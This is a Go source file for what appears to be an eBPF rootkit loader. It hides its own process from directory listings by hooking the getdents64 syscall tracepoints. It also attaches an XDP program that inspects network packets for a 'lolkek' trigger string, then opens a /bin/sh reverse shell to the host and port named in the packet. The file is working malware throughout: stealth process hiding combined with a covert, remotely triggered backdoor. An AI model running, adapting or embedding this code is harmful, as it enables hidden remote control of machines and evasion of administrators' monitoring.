package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"syscall"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/ringbuf"
	"github.com/cilium/ebpf/rlimit"
)

// const for tail calls
const (
	PROG_01 = 1
	PROG_02 = 2
)

const (
	MAX_PID_LEN   = 10
	TASK_COMM_LEN = 16
)

type pidhideEvent struct {
	Pid     int32
	Comm    [TASK_COMM_LEN]byte
	Success uint8
}

func main() {
	var pidToHide int
	var targetPPID int
	var ifaceName string

	flag.IntVar(&pidToHide, "p", 0, "Process ID to hide. Defaults to this program's PID")
	flag.IntVar(&targetPPID, "t", 0, "Optional Parent PID, will only affect its children (PID hide).")
	flag.StringVar(&ifaceName, "i", "eth0", "Network interface name to attach XDP program.")
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage: %s [options]\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Combines PID hiding (via getdents64 tracepoints) and XDP TCP packet processing.\n\nOptions:\n")
		flag.PrintDefaults()
	}
	flag.Parse()

	// PID Hide Setup
	pidToHide = os.Getpid()

	objs := pidhideObjects{}

	stopper := make(chan os.Signal, 1)
	signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)

	initBPF(pidToHide, targetPPID, &objs)
	defer objs.Close()

	// Attach Tracepoints
	tpEnter, tpExit := attachTP(&objs)
	defer tpEnter.Close()
	defer tpExit.Close()

	// Attach XDP
	xdpLink := attachXDP(&objs, ifaceName)
	defer xdpLink.Close()

	//Setup ring readers
	pidHideRd, xdpRd := setupRB(&objs)
	defer pidHideRd.Close()
	defer xdpRd.Close()

	// Goroutine for closing readers
	go func() {
		<-stopper
		log.Println("Received signal, stopping...")
		if err := pidHideRd.Close(); err != nil {
			log.Printf("PID Hide: Error closing ringbuf reader: %v", err)
		}
		if err := xdpRd.Close(); err != nil {
			log.Printf("XDP: Error closing ringbuf reader: %v", err)
		}
	}()

	log.Println("Successfully started! Waiting for events from PID Hide and XDP...")

	// PID Hide goroutine
	go func() {
		var event pidhideEvent

		for {
			record, err := pidHideRd.Read()
			if err != nil {
				if errors.Is(err, ringbuf.ErrClosed) {
					log.Println("PID Hide: Ringbuf reader closed.")
					return
				}
				log.Printf("PID Hide: Error reading from ringbuf: %v", err)
				continue
			}

			reader := bytes.NewReader(record.RawSample)
			if err := binary.Read(reader, binary.LittleEndian, &event); err != nil {
				log.Printf("PID Hide: Error parsing ringbuf event: %v", err)
				continue
			}

			comm := string(event.Comm[:])
			comm = strings.TrimRight(comm, "\x00")

			if event.Success != 0 {
				log.Printf("PID Hide: Successfully hid PID %d from program %d (%s)\n", pidToHide, event.Pid, comm)
			} else {
				log.Printf("PID Hide: Received 'failure' event (Success=0) for PID %d from program %d (%s)\n", pidToHide, event.Pid, comm)
			}
		}
	}()

	// XDP goroutine
	go func() {
		for {
			rec, err := xdpRd.Read()
			if err != nil {
				if errors.Is(err, ringbuf.ErrClosed) {
					log.Println("XDP: Ringbuf reader closed.")
					return
				}
				log.Printf("XDP: read error: %s", err)
				continue
			}

			data := rec.RawSample
			dataStr := string(data)
			// log.Printf("XDP: Received %d bytes.", len(data))

			if strings.Contains(dataStr, "lolkek") {
				log.Printf("XDP: Found 'lolkek' trigger in packet data: %q", dataStr)
				parts := strings.Fields(dataStr)
				if len(parts) >= 3 && parts[0] == "lolkek" {
					host := parts[1]
					port := parts[2]

					port = strings.Trim(port, "\x00")
					log.Printf("XDP: Triggering reverse shell to %s:%s", host, port)
		
					go revshell(host, port)
				} else {
					log.Printf("XDP: 'lolkek' found, but format invalid: %q", dataStr)
				}
			}
		}
	}()

	<-stopper
	log.Println("Shutting down main process...")
}

func initBPF(pidToHide int, targetPPID int, objs *pidhideObjects){
	pidStr := strconv.Itoa(pidToHide)
	if len(pidStr) >= MAX_PID_LEN {
		log.Fatalf("PID %d string representation is too long (max %d chars)", pidToHide, MAX_PID_LEN-1)
	}

	var pidToHideBytes [MAX_PID_LEN]byte
	copy(pidToHideBytes[:], []byte(pidStr))
	pidToHideLen := len(pidStr) + 1

	log.Printf("Attempting to hide PID: %d", pidToHide)
	if targetPPID != 0 {
		log.Printf("Targeting processes with parent PID: %d for hiding", targetPPID)
	}

	if err := rlimit.RemoveMemlock(); err != nil {
		log.Fatalf("Failed to remove memlock limit: %v", err)
	}

	spec, err := loadPidhide()
	if err != nil {
		log.Fatalf("Failed to load bpf spec: %v", err)
	}

	err = spec.RewriteConstants(map[string]interface{}{
		"pid_to_hide":     pidToHideBytes,        // [10]byte
		"pid_to_hide_len": int32(pidToHideLen), // C int -> Go int32
		"target_ppid":     int32(targetPPID),   // C int -> Go int32
	})
	if err != nil {
		log.Fatalf("Failed to rewrite constants: %v", err)
	}

	if err := spec.LoadAndAssign(objs, nil); err != nil {
		var ve *ebpf.VerifierError
		if errors.As(err, &ve) {
			log.Fatalf("Failed to load BPF objects: %v\n%+v", err, ve)
		}
		log.Fatalf("Failed to load BPF objects: %v", err)
	}

	// Tail Calls Setup
	exitProgFd := uint32(objs.HandleGetdentsExit.FD())  // Get FD of bpf programs
	patchProgFd := uint32(objs.HandleGetdentsPatch.FD())

	key1 := uint32(PROG_01)
	if err := objs.MapProgArray.Update(&key1, &exitProgFd, ebpf.UpdateAny); err != nil {
		log.Fatalf("Failed to update prog array for index %d (exit): %v", key1, err)
	}
	key2 := uint32(PROG_02)
	if err := objs.MapProgArray.Update(&key2, &patchProgFd, ebpf.UpdateAny); err != nil {
		log.Fatalf("Failed to update prog array for index %d (patch): %v", key2, err)
	}
	log.Println("PID Hide: Tail calls configured successfully.")
}

func attachTP(objs *pidhideObjects) (link.Link, link.Link){
	tpEnter, err := link.Tracepoint("syscalls", "sys_enter_getdents64", objs.HandleGetdentsEnter, nil)
	if err != nil {
		log.Fatalf("Failed to attach tracepoint sys_enter_getdents64: %v", err)
	}
	log.Println("PID Hide: Attached tracepoint: sys_enter_getdents64")

	tpExit, err := link.Tracepoint("syscalls", "sys_exit_getdents64", objs.HandleGetdentsExit, nil)
	if err != nil {
		log.Fatalf("Failed to attach tracepoint sys_exit_getdents64: %v", err)
	}
	log.Println("PID Hide: Attached tracepoint: sys_exit_getdents64")

	return tpEnter, tpExit
}

func attachXDP(objs *pidhideObjects, ifaceName string) link.Link{
	log.Printf("Attaching XDP program to interface: %s", ifaceName)
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		log.Fatalf("Getting interface %s: %s", ifaceName, err)
	}

	xdpLink, err := link.AttachXDP(link.XDPOptions{
		Program:   objs.XdpPass,
		Interface: iface.Index,
	})
	if err != nil {
		log.Fatalf("Attaching XDP to interface %s: %v", ifaceName, err)
	}
	log.Printf("XDP: Attached program to interface %s (%d)", ifaceName, iface.Index)

	return xdpLink
}

func setupRB(objs *pidhideObjects) (*ringbuf.Reader, *ringbuf.Reader){
	// PID Hide RB
	pidHideRd, err := ringbuf.NewReader(objs.Rb)
	if err != nil {
		log.Fatalf("PID Hide: Failed to create ringbuf reader: %v", err)
	}

	// XDP RB
	xdpRd, err := ringbuf.NewReader(objs.Xdprb)
	if err != nil {
		log.Fatalf("XDP: Failed to create ringbuf reader: %v", err)
	}

	return pidHideRd, xdpRd
}

func revshell(ip string, port string) {
	server := fmt.Sprintf("%s:%s", ip, port)
	log.Printf("RevShell: Attempting to connect to %s", server)

	conn, err := net.Dial("tcp", server)
	if err != nil {
		log.Printf("RevShell: Connection to %s failed: %v", server, err)
		return
	}
	defer conn.Close()
	log.Printf("RevShell: Connected to %s", server)

	ctx, cancel := context.WithCancel(context.Background())

	cmd := exec.CommandContext(ctx, "/bin/sh")

	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	if err := cmd.Start(); err != nil {
		log.Printf("RevShell: Failed to start shell: %v", err)
		return
	}
	log.Printf("RevShell: Shell process started")

	go func() {
		defer conn.Close()
		defer cancel()
		log.Printf("RevShell: Starting stdout/stderr copy to network")
		_, err := io.Copy(conn, io.MultiReader(stdout, stderr))
		if err != nil && !errors.Is(err, io.EOF) && !errors.Is(err, net.ErrClosed) && !strings.Contains(err.Error(), "use of closed network connection"){
			log.Printf("RevShell: Error copying shell output to network: %v", err)
		}
		log.Printf("RevShell: Stopped copying stdout/stderr to network")

	}()

	go func() {
		defer stdin.Close()
		defer cancel()
		log.Printf("RevShell: Starting network copy to shell stdin")
		_, err := io.Copy(stdin, conn)
		if err != nil && !errors.Is(err, io.EOF) && !errors.Is(err, net.ErrClosed) && !strings.Contains(err.Error(), "use of closed network connection"){
			log.Printf("RevShell: Error copying network input to shell: %v", err)
		}
		log.Printf("RevShell: Stopped copying network to shell stdin")

	}()

	err = cmd.Wait()
	log.Printf("RevShell: Shell process exited with error: %v", err)
}